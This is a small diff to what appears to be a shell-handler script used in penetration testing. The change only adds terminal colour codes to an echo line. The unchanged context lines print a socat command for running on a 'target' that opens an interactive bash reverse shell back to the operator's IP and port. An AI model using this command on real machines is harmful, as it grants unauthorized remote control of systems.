@@ -11,7 +11,7 @@ if [ "$1" == "socat" ]; then
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
   echo "> Run this on your target:"
   echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
